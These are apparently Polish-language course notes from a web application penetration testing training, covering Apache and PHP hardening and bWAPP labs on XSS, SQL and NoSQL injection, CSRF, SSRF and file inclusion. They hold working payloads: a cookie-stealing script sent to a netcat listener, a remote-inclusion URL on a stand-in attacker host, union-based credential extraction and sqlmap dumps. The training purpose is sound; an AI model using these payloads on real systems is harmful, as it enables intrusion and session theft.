@@ -1,0 +1,1461 @@
+📅 28.01.2023 🕘 [09:00]
+
+Wykładowca: Kamil Kamiński
+
+Global Web Application Penetration Testing
+
+Chapter 1 Web Technologies & OWASP TOP 10 and Web Vulnerabilities 
+= - = - = - = - = - = - =  - = - = - = - = - = - = - =- = - = - =
+
+ℹ️ Przerwy:
+
+10.30-11.00
+12.30-13.15
+15.00-15.15
+
+🔗 -- Dostęp do Kontra:
+https://tdx.application.security/
+
+[Web Technologies]
+
+🔗 -- Generator htaccess
+https://narzedzia.zenbox.pl/generator-htaccess/
+
+### 📋 – Lab01 Apache Installation
+
+    Uruchomienie serwera apache2
+
+    sudo su
+
+    service apache2 status
+
+    service apache2 start
+
+
+2. Konfiguracja serwera
+
+    nano /etc/apache2/apache2.conf
+
+
+    Nadpisywanie konfiguracji:
+
+    Zmiana z AllowOverride None na AllowOverride All
+
+3. Przekierowanie do pliku notfound.html
+
+    W katalogu /var/www/html tworzymy nowy plik notfound.html
+
+
+    notfound.html
+
+    <html>
+
+    <head><title>Strona z bledem</title></head>
+
+
+    <body>
+
+    Nie udalo sie znalezc zasobu
+
+    </body>
+
+
+    </html>
+
+
+Restart serwera
+
+    service apache2 restart
+
+
+    Przekierowanie do nieistniejącej strony
+
+    W katalogu /var/www/html tworzymy plik .htaccess i dodajemy wpis
+
+    ErrorDocument 404 /notfound.html
+
+
+    Przechodzimy w przeglądarce do nieistniejącego zasobu i otrzymujemy zawartość strony /notfound.html
+
+
+***
+
+### 📋 – Lab02 Information Disclosure
+
+#sprawdzamy czy wersja Apache się pojawi:
+curl -i -X OPTIONS -L http://127.0.0.1/
+
+#ukrycie wersji Apache:
+└─# nano /etc/apache2/apache2.conf
+#dodajemy wpisy:
+ServerTokens Prod
+ServerSignature off
+
+service apache2 restart    
+curl -i -X OPTIONS -L http://127.0.0.1/
+
+
+┌──(root㉿kali)-[/var/www/html]
+└─# mkdir cwiczenie01
+                                                                                       
+┌──(root㉿kali)-[/var/www/html]
+└─# cd cwiczenie01  
+                                                                                       
+┌──(root㉿kali)-[/var/www/html/cwiczenie01]
+└─# touch plik1 plik2 plik3
+#sprawdzamy w przeglądarce:
+localhost/cwiczenie01
+
+
+nano .htaccess
+#dodajemy wpis:
+Options -Indexes
+#nie działa już:
+localhost/cwiczenie01
+
+┌──(root㉿kali)-[/var/www/html]
+└─# a2dismod status
+┌──(root㉿kali)-[/var/www/html]
+└─# systemctl restart apache2 
+┌──(root㉿kali)-[/var/www/html]
+└─# nmap 127.0.0.1 --script=http-enum
+
+🔗 -- CIS Benchmark Apache HTTP Server
+https://www.cisecurity.org/benchmark/apache_http_server
+
+#aktualizacja systemu Kali Linux:
+apt update && apt upgrade -y && apt dist-upgrade -y && apt autoremove
+
+***
+
+### 📋 – Kontra: Components with Known Vulnerabilities
+
+***
+🔗 -- Notatki prowadzącego:
+
+LAMP
+
+Linux:
+        Apache
+        Mysql
+        PHP
+
+
+——————
+Co jeśli serwer chce wysłać wiadomość do klienta?
+- HTTP Pooling: Czy jest nowa wiadomość do mnie?  Czy jest nowa wiadomość do mnie?  
+- Long Pooling: utrzymujemy otwarte połączenie HTTP
+- WebSocket: full-duplex (połączenie dwukierunkowe) 
+
+———
+METODA[spacja]URL[spacja]WERSJA_HTTP
+GET /informacja.php?serwer=ok HTTP/1.1
+
+——
+Walidacja inuptu pod kątem poprawności danych.
+
+Sanityzacja:
+Dane przed: <script>alert(1)</script;
+Dane po: script alert 1 
+
+
+Backendowe języki: Java, C#, python, ruby, javascript (node.js), perl, java spring boot, apache tomcat, php. 
+
+——
+PHP GET/POST
+Tablice: tablica(klucz => wartość, klucz2 => wartosc2, klucz3 => wartosc3,…, ….)
+
+
+——
+Atak Local File Inclusion (LFI)
+W kodzie wykorzystana jest funkcja include()
+
+http://172.16.2.148/laby/vulnform.php?strony=/var/www/html/laby/plikzhaslami.txt&submit=#
+
+include(/var/www/html/laby/plikzhaslami.txt);
+
+Remote File Inclusion (RFI)
+W kodzie wykorzystana jest funkcja include()
+
+http://172.16.2.148/laby/vulnform.php?strony=http://serweratakujacego.pl/exploit.php&submit=#
+
+include(http://serweratakujacego.pl/exploit.php);
+
+Funkcja system():
+Kod w PHP:      system($cmd);
+
+http://172.16.2.148/laby/simple-backdoor.php?cmd=whoami
+
+system(whoami);
+
+***
+
+### 📋 – Lab04 Secured PHP Configuration
+
+└─# cd /etc/php 
+┌──(root㉿kali)-[/etc/php]
+└─# ls
+#wersja php zależy od posiadanej wersji
+┌──(root㉿kali)-[/etc/php]
+└─# a2enmod php8.1
+┌──(root㉿kali)-[/etc/php]
+└─# cd 8.1
+┌──(root㉿kali)-[/etc/php/8.1]
+└─# ls
+┌──(root㉿kali)-[/etc/php/8.1]
+└─# cd apache2 
+┌──(root㉿kali)-[/etc/php/8.1/apache2]
+└─# pwd
+┌──(root㉿kali)-[/etc/php/8.1/apache2]
+└─# cat php.ini| grep display_error
+┌──(root㉿kali)-[/etc/php/8.1/apache2]
+└─# cat php.ini| grep display_startup
+┌──(root㉿kali)-[/etc/php/8.1/apache2]
+└─# nano php.ini  
+#wartość ustawić na 30s
+max_execution_time = 30
+#wartość ustawić na 128M
+memory_limit = 128M
+┌──(root㉿kali)-[/etc/php/8.1/apache2]
+└─# cat php.ini| grep allow_url_include
+┌──(root㉿kali)-[/etc/php/8.1/apache2]
+└─# cat php.ini| grep allow_url_fopen  
+#należy zmienić parametr allow_url_fopen na off
+
+### 📋 – Lab05 `$_SERVER` Environment Variable
+
+┌──(root㉿kali)-[/etc/php/8.1/apache2]
+└─# service apache2 status
+┌──(root㉿kali)-[/etc/php/8.1/apache2]
+└─# service apache2 start 
+┌──(root㉿kali)-[/etc/php/8.1/apache2]
+└─# service apache2 status
+#wersja php zależy od posiadanej wersji
+┌──(root㉿kali)-[/etc/php]
+└─# a2enmod php8.1
+┌──(root㉿kali)-[/etc/php/8.1/apache2]
+└─# cd /var/www/html  
+┌──(root㉿kali)-[/var/www/html]
+└─# touch OKmessage.php
+└─# nano OKmessage.php 
+
+#kod php:
+
+<html>
+<head>
+        <title>Lab 06</title>
+</head>
+
+<body>
+To jest cwiczenie z PHP i pisania kodu.
+
+<?php
+echo "<h2>Witaj swiecie to jest kod napisany PHP</h2>"
+?>
+
+</body>
+</html>
+
+#aby zobaczyć wynik w przeglądarce wpisujemy:
+http://localhost/OKmessage.php
+
+***
+#LAB PISANIE PHP - KOD DO DOKONCZENIA:
+
+<html>
+<head>
+        <title>Lab 06</title>
+</head>
+
+<body>
+To jest cwiczenie z PHP i pisania kodu.
+
+<?php
+        echo "<h2>Witaj swiecie to jest kod napisany PHP</h2>"
+        if(isset($_GET['message'])){
+        if(TU NALEZY WPISAC ZE JESLI PARAMETR GET MESSAGE = OKAY TO){
+                echo 'Server Software: ' . $_SERVER['SERVER_SOFTWARE']
+                echo 'DOKONCZYC KOD'
+}
+}
+?>
+
+</body>
+</html>
+
+***
+#GOTOWY KOD LAB
+
+<html>
+<head>
+        <title>Lab 06</title>
+</head>
+
+<body>
+To jest cwiczenie z PHP i pisania kodu.
+
+
+<?php
+        echo "<h2>Witaj swiecie to jest kod napisany PHP</h2>";
+        if(isset($_GET['message'])){
+                if($_GET['message'] == "okay"){
+                        echo 'Server Software: ' . $_SERVER['SERVER_SOFTWARE'];
+                        echo 'User Agent: ' .  $_SERVER['HTTP_USER_AGENT'];
+
+}               else {
+                        echo "Warunek nie jest spelniony ";
+}
+}
+?>
+
+</body>
+</html>
+
+***
+
+request.php
+
+
+
+***
+🔗 -- Link do informacji o podatnościach PHP:
+https://www.cvedetails.com/product/128/PHP-PHP.html?vendor_id=74
+🔗 -- kalkulator podatności:
+https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator
+
+
+***
+### 📋 – Lab06 XSS-Sterilize
+
+xsslab.php
+
+<html>
+        <head>
+                <title>XSS lab</title>
+        </head>
+
+<body>
+To jest LAB z XSS</br></br>
+
+<?php
+        $imie_php = $_GET['imie'];
+        $nazwisko_php = $_GET['nazwisko'];
+
+        echo "Twoje imie to: " . $imie_php . "</br>";
+        echo "Twoje nazwisko to: " . $nazwisko_php;
+?>
+</body>
+</html>
+
+
+Wywołanie XSS Reflected
+http://localhost/xsslab.php?imie=adam&nazwisko=<script>alert(1)</script>
+
+Kod po sanityzacji htmlentities
+
+<html>
+        <head>
+                <title>XSS lab</title>
+        </head>
+
+<body>
+To jest LAB z XSS</br></br>
+
+<?php
+
+        $imie_php = htmlentities($_GET['imie']);
+        $nazwisko_php = htmlentities($_GET['nazwisko']);
+
+        echo "Twoje imie to: " . $imie_php . "</br>";
+        echo "Twoje nazwisko to: " . $nazwisko_php;
+?>
+</body>
+</html>
+
+***
+
+xsslab2.php (wersja rozszerzona)
+
+<html>
+        <head>
+                <title>XSS lab 2</title>
+        </head>
+
+<body>
+To jest LAB z XSS</br></br>
+
+<form method="get" action="<?php echo $_SERVER['PHP_SELF'];?>">
+GET imie: <input type="text" name="imie">
+GET nazwisko: <input type="text" name="nazwisko">
+<input type="submit">
+</form>
+
+</br>
+
+<form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>">
+POST imie: <input type="text" name="imie">
+POST nazwisko: <input type="text" name="nazwisko">
+<input type="submit">
+</form>
+
+
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+        $imie_php = htmlentities($_POST['imie']);
+        $nazwisko_php = htmlentities($_POST['nazwisko']);
+
+        echo "Wybrana metoda to POST" . "</br>";
+        echo "Twoje imie to: " . $imie_php . "</br>";
+        echo "Twoje nazwisko to: " . $nazwisko_php;
+}
+
+if (($_SERVER["REQUEST_METHOD"] == "GET") && isset($_GET['imie'])) {
+        $imie_php = htmlentities($_GET['imie']);
+        $nazwisko_php = htmlentities($_GET['nazwisko']);
+
+        echo "Wybrana metoda to GET" . "</br>";
+        echo "Twoje imie to: " . $imie_php . "</br>";
+        echo "Twoje nazwisko to: " . $nazwisko_php;
+}
+
+?>
+</body>
+</html>
+
+
+--- dummycode
+
+
+Formularz, który wysyła metodą GET wartość imie
+Formularz, który wysyła metodą POST wartość imie
+
+JEŚLI METODA_HTTP JEST RÓWNA POST:
+    zmienna $imie_php = sanityzuj(wartość imie z POST)
+    zmienna $nazwisko_php = sanityzuj(wartość naziwsko z POST)
+
+    wypisz "Wybrana metoda to POST"
+    wypisz "Twoje imie to " + wartość zmiennej $imie_php
+    wypisz "Twoje nazwisko to " + wartość zmiennej $nazwisko_php
+
+JEŚLI METODA_HTTP JEST RÓWNA GET ORAZ WARTOŚĆ IMIE JEST NIEPUSTE:
+    zmienna $imie_php = sanityzuj(wartość imie z GET)
+    zmienna $nazwisko_php = sanityzuj(wartość naziwsko z GET)
+
+    wypisz "Wybrana metoda to GET"
+    wypisz "Twoje imie to " + wartość zmiennej $imie_php
+    wypisz "Twoje nazwisko to " + wartość zmiennej $nazwisko_php
+
+***
+
+[OWASP TOP 10 and Web Vulnerabilities]
+
+🔗 -- OWASP Top 10 - 2021
+https://owasp.org/Top10/
+
+🔗 -- OWASP ASVS Application Security Verification Standard
+https://owasp.org/www-project-application-security-verification-standard/
+
+🔗 -- OWASP MASVS Mobile Application Security Verification Standard
+https://mas.owasp.org/MASVS/
+
+🔗 -- OWASP Web Security Testing Guide
+https://owasp.org/www-project-web-security-testing-guide/
+
+🔗 -- OWASP Cheat Sheet Series
+https://cheatsheetseries.owasp.org/
+
+🔗 -- Top 10 podatności w aplikacjach w 2022 roku według OWASP
+https://kapitanhack.pl/2023/01/26/nieskategoryzowane/top-10-podatnosci-w-aplikacjach-w-2022-roku-wedlug-owasp/
+
+***
+
+### 📋 – Kontra: Leftover Debug Code
+
+🔗 -- OSINT Framework
+https://osintframework.com/
+
+🔗 -- Google Hacking Database
+https://www.exploit-db.com/google-hacking-database
+
+***
+
+### 📋 – Lab07 Vulnerability Detection
+
+vulnform.php
+
+<html>
+        <head>
+                <title>Zly formularz</title>
+        </head>
+<body>
+
+<form method="get" action="#">
+    <select name="strony">
+        <option value="strona1.html">Strona 1</option>
+        <option value="strona2.html">Strona 2</option>
+    </select>
+    <button type="submit" name="submit">Enter</button>
+</form>
+
+<?php
+if (isset($_REQUEST['submit'])) {
+    $page = $_GET['strony'];
+    include($page);
+}
+
+?>
+
+</body>
+</html>
+
+
+strona1.html
+
+<html>
+To jest Strona pierwsza.
+</html>
+
+
+strona2.html
+
+<html>
+To jest Strona druga.
+</html>
+
+***
+
+Wykorzystanie LFI (Local File Inclusion)
+
+http://localhost/vulnform.php?strony=/etc/passwd&submit=#
+
+***
+
+Detectionlist
+
+include
+eval
+system
+exec
+include_once
+
+Sprawdzamy wystąpienia funkcji w kodzie vulnform.php
+cat vulnform.php | grep -f Detectionlist
+
+***
+
+📅 29.01.2023 🕘 [15:00]
+
+Global Web Application Penetration Testing
+
+Chapter 2 Burp & ZAP and XSS 
+= - = - = - = - = - = - =  -
+
+[Burp & ZAP]
+
+### 📋 – Lab01 Burp Suite Basics
+
+🔗 -- Download Burp Community 
+https://portswigger.net/burp/releases/professional-community-2022-12-7
+
+🔗 -- Install Guide
+https://portswigger.net/burp/documentation/desktop/getting-started/download-and-install
+
+Pobranie certyfikatu do konfiguracji przeglądarki (Kali)
+
+    Instalujemy FoxyProxy w przeglądarce
+
+    Dodajemy proxy dla Burp Suite - HTTP://127.0.0.1:8080
+
+    Po włączeniu proxy w przeglądarce idziemy na stronę http://burp/
+
+    Pobieramy certyfikat (link do szczegółowej instrukcji poniżej)
+
+🔗 -- https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate/ca-cert-firefox
+
+    Ustawienia przeglądarki i w Menadżerze Certyfikatów importujemy certyfikat
+
+
+***
+
+### 📋 – Lab02 bWAPP Docker
+
+Instalacja docker
+
+    sudo apt update
+
+    sudo apt install -y docker.io
+
+    docker -v
+
+    sudo service docker start
+
+
+Uruchomienie bWAPP
+
+    docker run -d -p 9000:80 raesene/bwapp
+
+
+Przeglądarka
+
+
+    localhost:9000/install.php
+
+
+***
+
+Notatki prowadzącego
+LAMP
+
+Linux:
+        Apache
+        Mysql
+        PHP
+
+
+——————
+Co jeśli serwer chce wysłać wiadomość do klienta?
+- HTTP Pooling: Czy jest nowa wiadomość do mnie?  Czy jest nowa wiadomość do mnie?  
+- Long Pooling: utrzymujemy otwarte połączenie HTTP
+- WebSocket: full-duplex (połączenie dwukierunkowe) 
+
+———
+METODA[spacja]URL[spacja]WERSJA_HTTP
+GET /informacja.php?serwer=ok HTTP/1.1
+
+——
+Walidacja inuptu pod kątem poprawności danych.
+
+Sanityzacja:
+Dane przed: <script>alert(1)</script;
+Dane po: script alert 1 
+
+
+Backendowe języki: Java, C#, python, ruby, javascript (node.js), perl, java spring boot, apache tomcat, php. 
+
+——
+PHP GET/POST
+Tablice: tablica(klucz => wartość, klucz2 => wartosc2, klucz3 => wartosc3,…, ….)
+
+If $_GET[message] =  okay 
+        echo coś tam coś tam
+
+——
+Atak Local File Inclusion (LFI)
+W kodzie wykorzystana jest funkcja include()
+
+http://172.16.2.148/laby/vulnform.php?strony=/var/www/html/laby/plikzhaslami.txt&submit=#
+
+include(/var/www/html/laby/plikzhaslami.txt);
+
+Remote File Inclusion (RFI)
+W kodzie wykorzystana jest funkcja include()
+
+http://172.16.2.148/laby/vulnform.php?strony=http://serweratakujacego.pl/exploit.php&submit=#
+
+include(http://serweratakujacego.pl/exploit.php);
+
+Funkcja system():
+Kod w PHP:      system($cmd);
+
+http://172.16.2.148/laby/simple-backdoor.php?cmd=whoami
+
+system(whoami);
+
+***
+
+📅 04.02.2023 🕘 [09:00]
+
+# Ponowne zainstalowanie bwapp
+
+    docker image ls
+
+    docker image rm <IMAGE ID>
+
+    docker run -d -p 9000:80 raesene/bwapp
+
+
+localhost:9000/install.php
+
+***
+
+### 📋 – Kontra: User Enumeration
+
+***
+
+### 📋 – TDX Arena: EnumUsers
+
+***
+
+### 📋 – Lab03 Burp Suite Repeater
+
+🔑 – bee:bug
+Security Level: low
+
+***
+
+### 📋 – Lab04 Burp Suite Intruder
+
+***
+
+### 📋 – Lab05 Intruder Follow Redirection
+
+🔗 -- strona do testów:
+https://hack-yourself-first.com/
+
+***
+
+### 📋 – Lab06 Brute Force Website’s Paths
+
+Burp Intruder
+
+/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+
+---
+
+[XSS]
+
+🔗 -- przykładowe wykonanie skryptu:
+https://suvroc.github.io/security-demos/XSS/reflectedXSS.html?name=<script>alert(1)</script>
+https://suvroc.github.io/security-demos/XSS/storedXSS.html
+
+### 📋 – Lab08 Reflected XSS 
+
+W BWAPP proszę wybrać: XSS-Reflected(GET)
+
+wpisujemy w pasku URL:
+http://172.16.2.148:9000/xss_get.php?firstname=%3Cscript%3Ealert(document.cookie)%3C/script%3E&lastname=adamski&form=submit
+
+<script>alert(document.cookie)</script>
+
+
+### 📋 – Lab09 Stored XSS 
+
+W BWAPP proszę wybrać: Cross-Site Scripting - Stored (Blog)/ XSS-Stored(Blog)
+<script>alert("Czy jestpodatny")</script>
+
+### 📋 – Lab10 Cookie Hijacking
+
+Należy uruchomić:
+nc -lvp 4444
+
+W BWAPP proszę wybrać: XSS - Reflected(GET)
+
+<script>new Image().src='http://172.16.2.148:4444/?cookie='+document.cookie; </script>
+
+***
+
+📅 05.02.2023 🕘 [09:00]
+
+🔗 -- przykładowy cheatsheet z instrukcją jak ominąć filtry:
+https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+
+🏠 Homework. Przerobić laby z bWAPP:
+XSS - Stored (Blog)
+XSS - Reflected (GET)\
+XSS - Reflected (Post)
+
+i zadania z Kontra.
+
+***
+
+Chapter 3: Database Management & SQL Injection
+= - = - = - = - = - = - = - = - = - = - = - = -
+
+[Database Management]
+
+🔗 -- komendy Docker
+https://frontstack.pl/docker-komendy/
+https://bykowski.pl/docker-lista-komand-twoja-podreczna-sciaga/
+
+🔗 -- kolumny i tabele w bazie danych
+https://cdn.tutsplus.com/net/authors/lalith-polepeddi/relational-databases-for-dummies-fig1.png
+
+***
+
+### 📋 – Lab01 Building an SQL Database
+
+#Tworzenie nowego kontenera:
+docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql
+
+docker run --name mysql_lab -p 3306:3306  -e MYSQL_ROOT_PASSWORD=sqlhaslo -d mysql
+
+mysql --protocol=tcp -u root -p
+
+#listuje bazy danych:
+show databases;
+
+#Tworzenie bazy danych
+create database cyber;
+
+#Wejscie do bazy danych
+use cyber;
+
+#Tworzenie tabeli:
+CREATE TABLE whitehacker(id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY, username VARCHAR(30) NOT NULL, password VARCHAR(20) NOT NULL, country VARCHAR(20) NOT NULL, role VARCHAR(20) NOT NUL);
+
+#Usuwanie tabeki:
+drop table whitehacker;
+
+#wyświetlanie tabeli:
+show tables;
+
+#Tworzenie tabeli blackhacker:
+create table blackhacker(id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY, username VARCHAR(30) NOT NULL, password VARCHAR(20) NOT NULL, country VARCHAR(20) NOT NULL, role VARCHAR(20) NOT NULL);
+
+#wyświetla zawartość tabeli:
+describe whitehacker;
+
+#Uzupełnianie tabeli whitehacker:
+INSERT INTO whitehacker (username,password,country,role) values
+-> ("Adam","12345","PL","Admin"),
+-> ("Tomek","haslo12","PL","Ksiegowy"),
+-> ("TOM","password","UK","Pentester"),
+-> ("Kasia","kasiakasia","PL","Dyrektor Finansowy"),
+-> ("Zosia","qwertyhhshjhs","USA","Stazysta");
+
+#Wyświetla wybrane dane (* - wszystkie dane) z tabeli:
+select * from whitehacker;
+
+#Uzupełnianie tabeli blackhacker:
+INSERT INTO blackhacker (username, password, country, role) VALUES 
+    -> ("Tadeusz", "kot", "PL", "Naczlnym Hax0r3m"), 
+    -> ("Anonimowy Hax0r", "adaslkm233klmdkm23", "TAJNE", "Secret Stanowisko"),
+    -> ("Malgorzata", "gosia12", "JPN", "Menedzer"), 
+    -> ("Tomasz", "tomasztomasz", "PL", "Junior"),
+    -> ("Marzena", "12345", "CZ", "Programistka");
+
+
+SELECT * FROM blackhacker;
+
+SELECT username, password FROM blackhacker;
+
+SELECT username, password FROM blackhacker WHERE id=1;
+
+#Sortowanie po id (domyślnie rosnąco)
+select * from whitehacker order by id;
+
+#Sortowanie po id, malejąco (desc)
+select * from whitehacker order by id desc;
+
+#Sortowanie po id, ograniczone do 2 wpisów:
+select * from whitehacker order by id LIMIT 2;
+
+#Sortowanie po id, filtrowanie o wybranej kolumnie (2 - password):
+select * from whitehacker order by 2;
+
+#Łączenie zapytań:
+SELECT * FROM whitehacker UNION SELECT * FROM blackhacker;
+
+SELECT username, password FROM blackhacker UNION SELECT country, role FROM whitehacker; 
+
+#dokleja/ dopisuje 1, 2 zamiast wyświetlenia kolumny w  drugiej tabeli
+SELECT username, password FROM blackhacker UNION SELECT 1,2; 
+SELECT username, password FROM blackhacker UNION SELECT "hakujemy", "jakies tam słowo";
+
+#doklei odpowiednio: wersję MySQL, nazwę bazy, zalogowanego usera:
+SELECT username, password FROM blackhacker UNION SELECT version(), "jakies tam słowo";
+
+SELECT username, password FROM blackhacker UNION SELECT version(), database();
+
+SELECT username, password FROM blackhacker UNION SELECT version(),user();
+
+***
+
+### 📋 – Lab02 Displaying Specific Data
+
+1. SELECT * FROM whitehacker;
+2. SELECT * FROM blackhacker;
+3. SELECT table_name FROM information_schema.tables;
+4. Informacje o sesji:
+
+    use information_schema;
+
+    show session status;
+
+
+***
+
+### 📋 – Lab03 SELECT Queries
+
+1. SELECT * FROM blackhacker WHERE country="PL";
+2. SELECT * FROM blackhacker WHERE country="GER";
+3. SQL injection
+
+    SELECT * FROM blackhacker WHERE country="GER" OR 1=1;
+
+4. SELECT * FROM blackhacker ORDER BY role;
+5. SELECT username, password, country, role FROM blackhacker UNION ALL SELECT username, password, country, role FROM whitehacker;
+6. Export pliku
+
+    SELECT username, password, country, role FROM blackhacker UNION ALL SELECT username, password, country, role FROM whitehacker INTO OUTFILE '/var/lib/mysql-files/eksport.txt';
+
+
+Wejście do dockera z mysql:
+    docker exec -it mysql_lab /bin/bash
+
+***
+
+[SQL Injection]
+
+### 📋 – Kontra: SQL Injection
+
+***
+
+bWapp > / SQL Injection (GET/Search) /
+
+Search for a movie: man' or 1=1#
+
+***
+
+### 📋 – Lab05 Boolean-Based
+
+bWapp > / SQL Injection (Login Form/Hero) /
+
+Login: login' OR 1=1 -- -
+Password: dowolne
+
+***
+
+### 📋 – Lab06 Union-Based
+
+bWapp > / SQL Injection (GET/Search) /
+
+Search for a movie:
+
+    ' order by 7 -- -
+
+    1' UNION SELECT 1,2,3,4,5,6,7 -- -
+
+    1' UNION SELECT 1,version(),3,4,5,6,7 -- -
+
+    1' UNION SELECT 1,database(),3,4,5,6,7 -- -
+
+    1' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()-- -
+
+    1' UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_name='users'-- -
+
+    1' UNION SELECT 1, concat(login, " ", password),3,4,5,6,7 FROM users-- -
+
+
+***
+
+📅 05.02.2023 🕘 [16:00]
+
+Global Web Application Penetration Testing
+
+Chapter 4: Advanced SQLi & NoSQL Injection 
+= - = - = - = - = - = - =  - = - = - = - = 
+
+[Advanced SQLi]
+
+### 📋 – Lab01 Enumeration with Intruder
+
+bWapp > / SQL Injection - Blind - Time-Based /
+
+Search for a movie:
+
+    aa' OR sleep(0.5) -- -
+
+    iron man' AND substring(database(),1,1)="b" and sleep(0.5) -- -
+
+    Send to Intruder
+
+    zaznaczamy cyfrę od której startujemy §1§ oraz literę §b§ > Cluster Bomb
+
+    GET /sqli_15.php?title=iron+man%27+AND+substring%28database%28%29%2C§1§%2C1%29%3D%22§b§%22+AND+sleep%280.5%29+--+-&action=search HTTP/1.1
+
+    Payload 1: Wybieramy listę Numbers > 1 - 6
+
+    Payload 2: Tworzymy słownik liter od a - z
+
+    Start Attack
+
+    Na liście wyników dodajemy kolumnę Response recevied
+
+    Wyniki:
+
+    1 - b
+
+    2 - w
+
+    3 - a
+
+    4 - p
+
+    5 - p
+
+
+***
+
+### 📋 – Lab02 SQLMap
+
+bWapp > / SQL Injection (GET/Search) /
+
+Przechwytujemy GET z Burp i edytujemy
+
+sqli.req
+GET /sqli_1.php?title=*&action=search HTTP/1.1
+
+Terminal:
+
+    sqlmap -r sqli.req
+
+    sqlmap -r sqli.req --dbs --tables
+
+    sqlmap -r sqli.req -D bwapp -T users --dump
+
+
+***
+
+📅 11.02.2023 🕘 [09:00]
+
+Zaawamsowane zapytanie do bazy danych:
+
+    SELECT Username, Role FROM blackhacker ORDER BY (case when (SELECT substring(Username,1,1) FROM blackhacker WHERE id=1) );
+
+
+    SELECT Username, Role FROM blackhacker ORDER BY (case when (SELECT substring(Username,1,1) FROM blackhacker WHERE id=1)='J' then Username else Department end);
+
+
+***
+
+🔗 -- Tabela ASCII
+https://www.asciitable.com/
+
+***
+
+### 📋 – Lab03 Enumerating a Website
+
+# dirb
+
+dirb http://localhost:9000/ /usr/share/wordlists/dirb/big.txt -X .php
+
+
+# gobuster
+
+sudo apt update
+sudo apt install gobuster
+
+gobuster dir -u http://localhost:9000/ -w /usr/share/wordlists/dirb/big.txt -x php
+
+***
+
+Zapytanie do bazy z wykorzystaniem concat:
+    
+SELECT CONCAT((SELECT database()), "-----", "test lab" );
+
+***
+
+[NoSQL Injection]
+
+### 📋 – Lab04 MongoDB Installation
+
+Instalacja MongoDB
+
+sudo su
+wget -qO - https://www.mongodb.org/static/pgp/server-5.0.asc | sudo apt-key add -
+echo "deb http://repo.mongodb.org/apt/debian buster/mongodb-org/5.0 main" | sudo tee /etc/apt/sources.list.d/mongodb-org-5.0.list   
+
+apt update
+apt install mongodb-org
+service mongod start
+service mongod status
+mongo
+
+II opcja
+
+wget -qO - https://www.mongodb.org/static/pgp/server-6.0.asc | sudo apt-key add -
+echo "deb http://repo.mongodb.org/apt/debian buster/mongodb-org/6.0 main" | sudo tee /etc/apt/sources.list.d/mongodb-org-6.0.list
+apt update
+apt-get install -y mongodb-org
+service mongod start
+service mongod status
+mongo
+# Do you want to install it? (N/y)y
+apt install mongodb-clients
+mongo
+
+***
+
+### 📋 – Lab05 Database Management
+
+4. db.uzytkownicy.insertMany([{name:"Leo"},{name:"Donie"},{name:"Mikey"},{name:"Raplh"},{name:"Splinter"}])
+
+5. db.uzytkownicy.find()
+
+6. db.uzytkownicy.find({name: "Mikey"})
+
+***
+
+### 📋 – Lab06 NoSQL Injection
+
+🔗 -- NoSQL MongoDB
+https://ln4.sync.com/dl/03be902f0/xevarw9g-mgudu57e-b2wu9h5f-fkhc27qp/
+
+MongoDB Server.ova - 10.3 GB
+
+🔑 -- root:toor
+
+service apache2 start
+service mongod start
+
+John:[$exists]
+
+7. http://localhost/data.php?username[$exists]&password[$exists]
+8. http://localhost/data.php?username[$regex]=^Z&password[$exists]
+
+***
+
+### 📋 – Lab07 Securing MongoDB
+
+use admin
+db.createUser({user: "root", pwd: "toor", roles:[{role: "userAdminAnyDatabase", db:"admin"}, "readWriteAnyDatabase"]})
+
+# Zmiany w pliku /etc/mongod.conf
+
+#security
+setParameter:
+    enableLocalhostAuthBypass: false
+security:
+    authorization: enabled
+
+service mongod restart
+
+mongo -u "root" -p
+
+***
+
+📅 11.02.2023 🕘 [12:20]
+
+Global Web Application Penetration Testing
+
+Chapter 5: Identification and Authentication Failures & CSRF and XXE & SSRF 
+= - = - = - = - = - = - =  - = - = - = - = - = - = - = - = - = - = - = = - 
+
+[Identification and Authentication Failures & CSRF]
+
+### 📋 – Kontra: Token Exposure in URL
+
+### 📋 – Kontra: Cross Site Request Forgery
+
+***
+
+### 📋 – Lab01 CSRF via GET
+
+docker start ID_bWAPP
+lub 
+docker run -d -p 9000:80 raesene/bwapp
+IP:9000/install.php
+
+### 📋 – Lab02 CSRF via POST
+
+https://owasp.org/www-project-secure-headers/
+bWAPP CSRF (Change Secret)
+
+cd /var/www/html
+nano csrf.html
+
+#wkleic kod i podmienić adres IP:
+<html>
+  <!-- CSRF PoC - generated by Burp Suite Professional -->
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://172.16.2.148:9001/csrf_3.php" method="POST">
+      <input type="hidden" name="secret" value="nowytajny" />
+      <input type="hidden" name="login" value="alicja" />
+      <input type="hidden" name="action" value="change" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+service apache2 start
+
+### 📋 – Lab03 Password Attack
+
+### 📋 – Lab04 SSRF Attack
+
+
+[XXE & SSRF]
+
+#inne zapisy dla 127.0.0.1
+0177.0.0.1
+0177.0×01.0.1
+0x7f.0.0.0×01
+127.1
+
+🔗 -- Instance metadata and user data
+https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
+
+***
+
+📅 12.02.2023 🕘 [9:00]
+
+Global Web Application Penetration Testing
+
+Chapter 6 LFI/RFI to RCE & WordPress Hacking and Reporting & Vulnerabilities
+
+= - = - = - = - = - = - =  - = - = - = - = - = - = - = - = - = - = - = = - 
+
+[ LFI/RFI to RCE & WordPress Hacking]
+
+### 📋 – Lab01 Local File Inclusion
+
+w bWAPP należy wybrać Remote &Local File Inclusion (RFI/LFI)
+należy wybrać język
+w url należy podmienić =/etc/passwd zamiast języka 
+
+### 📋 – Lab02 Abusing File Streams
+
+w bWAPP należy wybrać Remote &Local File Inclusion (RFI/LFI)
+należy wybrać język
+podsłuchać ruch w Burp
+przekleić w url przeglądarki zmieniająć <ADRESBWAPPA> na swój:
+    
